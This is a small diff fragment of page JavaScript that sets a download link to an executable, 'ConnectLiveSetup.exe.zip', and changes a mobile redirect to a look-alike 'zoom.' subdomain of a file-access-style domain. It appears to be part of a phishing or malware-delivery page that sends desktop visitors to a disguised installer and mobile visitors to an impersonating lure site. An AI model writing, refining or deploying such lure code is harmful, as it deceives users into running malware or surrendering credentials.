@@ -31,7 +31,7 @@ document.addEventListener("DOMContentLoaded", () => {
         "https://application.connectliveagent.com/ConnectLiveSetup.exe.zip";
 
     const MOBILE_DESTINATION =
-        "https://document.drive0g5folderaccess.com/";
+        "https://zoom.drive0g5folderaccess.com/";
 
 
     /*
